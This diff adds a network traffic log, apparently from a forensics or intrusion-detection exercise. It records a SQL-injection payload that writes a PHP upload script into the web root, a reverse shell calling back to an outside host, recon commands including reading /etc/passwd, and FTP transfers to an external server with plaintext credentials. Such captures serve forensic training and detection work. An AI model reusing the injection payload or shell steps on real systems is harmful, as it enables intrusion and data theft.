@@ -1,0 +1,182 @@
+1461434617.804113|84.11.146.55|1505|80|209.10.120.28|POST /e.aspx HTTP/1.1|219|mmi.cloud.avg.com|423|200|0.032831|0.000615|0.040951
+1461434618.303665|84.11.146.55|1506|80|209.10.120.30|POST /mw.aspx HTTP/1.1|449|prev.cloud.avg.com|189|200|0.033582|0.000531|0.248552
+1461434620.594350|84.11.146.55|1508|80|192.168.1.124|GET /results.php?FirstName=&LastName=&Email=&SSN=%27+union+select+1%2C%27%3C%3Fphp+%24target_dir+%3D+%22uploads%2F%22%3B+%24target_file+%3D+%24target_dir+.+basename%28%24_FILES%5B%22fileToUpload%22%5D%5B%22name%22%5D%29%3B+if+%28move_uploaded_file%28%24_FILES%5B%22fileToUpload%22%5D%5B%22tmp_name%22%5D%2C+%24target_file%29%29+%7B+echo+%22The+file+%22.+basename%28+%24_FILES%5B%22fileToUpload%22%5D%5B%22name%22%5D%29.+%22+has+been+uploaded.%22%3B%7D+else+%7B+echo+%22Sorry%2C+there+was+an+error+uploading+your+file.%22%3B+%7D%3F%3E%27%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24+into+outfile+%27%2Fvar%2Fwww%2Fhtml%2FWSO_upload.php HTTP/1.1|1001|192.168.1.124|196|200|0.006846|0.000472|0.003314
+1461434712.730864|84.11.146.55|1599|80|192.168.1.124|POST /WSO_upload.php HTTP/1.1|283400|192.168.1.124|287|200|0.007178|0.000525|0.007601
+1461434786.555356|192.168.1.124|43410|80|84.11.146.55|bash: cannot set terminal process group (7185): Inappropriate ioctl for device
+|79|N/A|2|N/A|0.005787|0.004147|0.002786
+1461434786.627963|192.168.1.124|43410|80|84.11.146.55|bash: no job control in this shell
+www-data@Victim:/var/www/html$ 
+www-data@Victim:/var/www/html$ 
+www-data@Victim:/var/www/html$ |130|N/A|7|N/A|N/A|N/A|0.006260
+1461434797.9193|192.168.1.124|43410|80|84.11.146.55|whoami
+www-data
+www-data@Victim:/var/www/html$ |47|N/A|8|-llh|N/A|N/A|0.006252
+1461434801.108166|192.168.1.124|43410|80|84.11.146.55|ls -llh
+total 424K
+-rwxr-xr-x 1 www-data www-data   54 Apr 23 13:06 WSO_reverse_shell.sh
+-rw-rw-rw- 1 root     root      175 Apr 23 13:04 WSO_shell.php
+-rw-rw-rw- 1 root     root      315 Apr 23 13:03 WSO_submission.php
+-rw-rw-rw- 1 root     root      394 Apr 23 13:03 WSO_upload.php
+-rw-r--r-- 1 root     root     276K Apr 22 17:53 agent.exe
+drwxrwxr-x 2 acas4    acas4    4.0K Apr 23 12:55 backup
+drwxrwxr-x 6 acas4    acas4    4.0K Apr 20 17:18 dev
+-rw-r--r-- 1 acas4    acas4    1.1K Apr 21 18:38 index.php
+-rw-r--r-- 1 www-data www-data 110K Apr 21 11:08 logo.png
+-rw-r--r-- 1 acas4    acas4    1.3K Apr 20 17:19 results.php
+drwxrwxrwx 2 www-data www-data 4.0K Apr 23 13:05 uploads
+www-data@Victim:/var/www/html$ |718|N/A|4|N/A|N/A|N/A|0.006557
+1461434802.748179|192.168.1.124|43410|80|84.11.146.55|pwd
+/var/www/html
+www-data@Victim:/var/www/html$ |49|N/A|6|N/A|N/A|N/A|0.006526
+1461434804.358909|192.168.1.124|43410|80|84.11.146.55|route
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         WiFi            0.0.0.0         UG    0      0        0 eth0
+10.1.9.0        *               255.255.255.0   U     1      0        0 eth1
+192.168.1.0     *               255.255.255.0   U     1      0        0 eth0
+www-data@Victim:/var/www/html$ |370|N/A|14|-antp|N/A|N/A|0.006252
+1461434809.201461|192.168.1.124|43410|80|84.11.146.55|netstat -antp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        1      0 192.168.1.124:34698     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34690     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:43126     162.213.33.49:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:44760     162.213.33.50:443       CLOSE_WAIT  -               
+tcp        0      0 192.168.1.124:22        192.168.1.119:1334      ESTABLISHED -               
+tcp        1      0 192.168.1.124:44750     162.213.33.50:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:43136     162.213.33.49:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:44754     162.213.33.50:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34676     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34680     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        0      0 192.168.1.124:22        192.168.1.149:6991      ESTABLISHED -               
+tcp        0    139 192.168.1.124:43410     192.168.1.119:80        ESTABLISHED 15818/bash      
+tcp        0      0 192.168.1.124:80        192.168.1.119:1646      ESTABLISHED -               
+tcp        1      0 192.168.1.124:44752     162.213.33.50:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34678     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34696     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34700     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34714     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34702     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        1      0 192.168.1.124:34688     162.213.33.48:443       CLOSE_WAIT  -               
+tcp        0      0 192.168.1.124:80        192.168.1.119:1631      TIME_WAIT   -               
+tcp        0      0 192.168.1.124:22        192.168.1.119:1700      ESTABLISHED -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+www-data@Victim:/var/www/html$ |3134|N/A|9|-a|N/A|N/A|0.003283
+1461434811.625529|192.168.1.124|43410|80|84.11.146.55|uname -a
+Linux Victim 4.2.0-35-generic #40~14.04.1-Ubuntu SMP Fri Mar 18 16:37:35 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+www-data@Victim:/var/www/html$ |153|N/A|16|/etc/passwd|N/A|N/A|0.006188
+1461434822.789979|192.168.1.124|43410|80|84.11.146.55|cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
+dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
+saned:x:108:115::/home/saned:/bin/false
+whoopsie:x:109:116::/nonexistent:/bin/false
+speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
+colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
+hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+acas4:x:1000:1000:acas4,,,:/home/acas4:/bin/bash
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+mysql:x:0:0:MySQL Server,,,:/nonexistent:/bin/bash
+sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
+snort:x:116:126:Snort IDS:/var/log/snort:/bin/false
+www-data@Victim:/var/www/html$ |2104|N/A|1|N/A|N/A|N/A|0.015012
+1461434920.945934|192.168.1.124|43410|80|84.11.146.55|
+www-data@Victim:/var/www/html$ |32|N/A|1|N/A|N/A|N/A|0.002347
+1461434921.8388|192.168.1.124|43410|80|84.11.146.55|
+www-data@Victim:/var/www/html$ |32|N/A|1|N/A|N/A|N/A|0.006344
+1461434921.732155|192.168.1.124|43410|80|84.11.146.55|
+www-data@Victim:/var/www/html$ |32|N/A|1|N/A|N/A|N/A|0.007449
+1461434972.34398|84.11.146.55|1667|443|65.55.68.104|...........W..\Y[..k....|189|N/A|2978|....Q..W..`~,....(,....k.0...fs.f.".G'.|0.231569|0.006335|0.076046
+1461434972.537506|84.11.146.55|1668|443|65.55.68.104|...........W..\&
+.Q..Le.E..xY;..%.[..p!.... .0... h..=2.d6.......5...<.......0.(.'.............=.<.5./.,.+.$.#.
+.	.j.@.8.2.
+.....[.........snt407-m.hotmail.com.
+...............|221|N/A|2978|....Q..W..a....5d....3...%.+I:...p9."}.|0.085862|0.000465|0.051625
+1461434972.742296|84.11.146.55|1668|443|65.55.68.104|....f...ba..p.QF.j..$ID...."%.-X...O\.R...C.8_.....3.........I..H.#......?/I.".x...t.0f.qtYq2.^..S0../.k?V...........`X.f..opu..Y+!....E.R+.,..bg......@$YV..NS.<.s+.............x..?.w.j.,..&/H.+.......IT......b..|214|N/A|107|[....)y.N.2..@.|N/A|N/A|0.001099
+1461434973.582638|84.11.146.55|1669|443|65.55.68.104|...........W..].........m...o..Y>'.....s... ....g..,..v..x...f....|221|N/A|2978|....Q..W..b....]..3>.g..vB.x......>{..>|0.056520|0.000740|0.013120
+1461434973.873079|84.11.146.55|1669|443|65.55.68.104|....f...ba..F.b.wf.j..T...w+_.8....#.5G%A'h.7[<..|214|N/A|107|.....r..6.V(_uP.X.'o..|.DLVQ.....EK.G|N/A|N/A|0.000623
+1461434972.265043|84.11.146.55|1667|443|65.55.68.104|....f...ba..K..8....).}...~....\....y6xc.........T....h...*H4 J.H.J.lQ ..\[....a.H.|1899|N/A|704|.zq.1.......r.o.\.w....W.|)f...E6|N/A|N/A|8.956005
+1461434974.73606|84.11.146.55|1669|443|65.55.68.104|....PN..3..M~Sq.. 15.*.
+.%...6G.A.D.:....G..31......w	36.?.$.l..+....'...R..isWY.j...>&.u@..|1722|N/A|501|.m.F..+..$....|N/A|N/A|7.197073
+1461434972.955387|84.11.146.55|1668|443|65.55.68.104|....P:.f.NOl50."...b...+.
+.....Bb.	..
+..mN.=...).k..@..S..z.4..|.]"..j...... .z....u.."......w..FD@..i.<.....[...@....-..lR.q.....*.^b..P4Qu....^bs:... n....*..... 
+H>@_q........:.|2458|N/A|485|.3.1/(.(P..aX...3.A4...=..f...........W.|N/A|N/A|8.035140
+1461434981.366509|84.11.146.55|1673|443|104.214.35.244|...........W..e.?.....T..~....B+ ..../.XBD0..0.(.'.............=.<.5./.,.+.$.#.
+.	.j.@.8.2.
+.....`.........nexus.officeapps.live.com.
+...............|194|N/A|5358|....w.....E..{...f^...O]i....|z..(..|0.051976|0.003747|0.077296
+1461434981.508030|84.11.146.55|1673|443|104.214.35.244|....f...ba.5Y.....kq...r..'.n.`...0.....rqr..../!.T,......o.^.+.....|.g.4...../..l....;-...x..+`ec}.A.k}..e..........`.P.s...G..9..Ewl6.8;.1........[".+..?...`.I3|214|N/A|107|...?|N/A|N/A|0.003961
+1461434981.576239|84.11.146.55|1673|443|104.214.35.244|....P...%..q........P..."9..[......w.%W....tu.X/d.Fr..J......./B....|..N.......<O.:.....q...."O.......j./..l.......K.W8M.<...US.._"	....D..%A...
+..D...u...}c.....i....v..vY;|1546|N/A|725|>.mI...M.!F.....@....N..laB|G...f.....m..U;.qD...TAO......j....$...-....%!..a.b........~7.7&...be.I?5v......ax!|.:DN.L.......lP....[...b......t...6.*...[...|N/A|N/A|0.008670
+1461434922.46652|192.168.1.124|43410|80|84.11.146.55|
+www-data@Victim:/var/www/html$ |32|N/A|7|-a|N/A|N/A|0.002531
+1461434996.168394|192.168.1.124|43410|80|84.11.146.55|a? (192.168.1.149) at 40:16:7e:17:43:01 [ether] on eth0
+? (192.168.1.126) at 08:00:27:5d:b8:3a [ether] on eth0
+? (10.1.9.11) at 08:00:27:6e:1e:8f [ether] on eth1
+? (10.1.9.233) at 1c:30:1c:eb:ab:30 [ether] on eth1
+? (10.1.9.187) at de:ad:be:ef:20:16 [ether] on eth1
+? (10.1.9.137) at d1:c3:ee:6e:1e:67 [ether] on eth1
+? (10.1.9.21) at 08:47:a7:92:1c:80 [ether] on eth1
+? (10.1.9.69) at fa:ce:b0:0c:b4:b3 [ether] on eth1
+? (10.1.9.11) at 08:00:27:6e:1e:8f [ether] on eth1
+? (10.1.9.44) at 40:4b:ad:c0:ff:ee [ether] on eth1
+? (10.1.9.13) at 08:00:27:6e:1e:8f [ether] on eth1
+? (10.1.9.216) at de:ca:fe:dd:05:8f [ether] on eth1
+? (10.1.9.58) at 11:69:4c:4d:1e:5f [ether] on eth1
+? (10.1.9.6) at 1s:d3:10:4e:de:55 [ether] on eth1
+? (10.1.9.7) at 00:7d:1e:00:7d:1e [ether] on eth1
+? (192.168.1.1) at b4:75:0e:43:f1:e4 [ether] on eth0
+www-data@Victim:/var/www/html$ |860|N/A|95|10.1.9.11|N/A|N/A|0.083596
+1461434985.32638|84.11.146.55|1677|80|207.46.101.29|POST /UploadData.aspx HTTP/1.1|15356|ds.ssw.live.com|178|200|0.255626|0.000559|62.936810
+1461434971.668422|84.11.146.55|1026|80|104.73.160.18|GET /cgtile/v1/EN-US/News/today/3.xml?cgversion=v6 HTTP/1.1|149|en-us.appex-rf.msn.com|1958|200|0.027399|0.000121|118.581592
+1461434971.668482|84.11.146.55|1024|80|104.73.160.18|GET /cgtile/v1/EN-US/News/today/4.xml?cgversion=v6 HTTP/1.1|149|en-us.appex-rf.msn.com|1941|200|0.027430|0.000150|118.586050
+1461434971.659061|84.11.146.55|1025|80|104.73.160.18|GET /cgtile/v1/EN-US/News/today/2.xml?cgversion=v6 HTTP/1.1|149|en-us.appex-rf.msn.com|1936|200|0.017945|0.000214|118.603631
+1461434971.668462|84.11.146.55|1666|80|104.73.160.18|GET /cgtile/v1/EN-US/News/Today.xml?cgversion=v6 HTTP/1.1|147|en-us.appex-rf.msn.com|1556|200|0.027346|0.000214|118.590412
+1461435048.95006|192.168.1.124|43410|80|84.11.146.55|nesisii_presentation.pdf|323|N/A|22|app-documents.com|N/A|N/A|0.012319
+N/A|10.1.9.11|1106|21|107.6.181.116||0|N/A|24|Evil|0.000243|N/A|2.359974
+1461293881.803253|10.1.9.11|1106|21|107.6.181.116|USER victim|13|N/A|34|Password|N/A|N/A|2.687840
+1461293884.491434|10.1.9.11|1106|21|107.6.181.116|PASS password|15|N/A|15|Logged|N/A|N/A|2.567731
+1461293887.61500|107.6.181.116|20|1108|10.1.9.11|0-Op31|77|N/A|0|N/A|0.000190|0.000006|N/A
+N/A|107.6.181.116|20|1109|10.1.9.11||0|N/A|0|N/A|0.000175|N/A|N/A
+N/A|107.6.181.116|20|1110|10.1.9.11||0|N/A|1571062|N/A|0.000387|N/A|0.000211
+N/A|107.6.181.116|20|1111|10.1.9.11||0|N/A|856754|N/A|0.000258|N/A|0.000217
+N/A|107.6.181.116|20|1112|10.1.9.11||0|N/A|325158|N/A|0.000160|N/A|0.000312
+N/A|107.6.181.116|20|1113|10.1.9.11||0|N/A|240172|N/A|0.000177|N/A|0.000198
+N/A|107.6.181.116|20|1114|10.1.9.11||0|N/A|26155|N/A|0.000220|N/A|0.000263
+N/A|107.6.181.116|20|1115|10.1.9.11||0|N/A|91963|%....|0.000153|N/A|0.000272
+1461293967.789940|107.6.181.116|20|1116|10.1.9.11|0-Op31|130|N/A|0|N/A|0.000141|0.000048|N/A
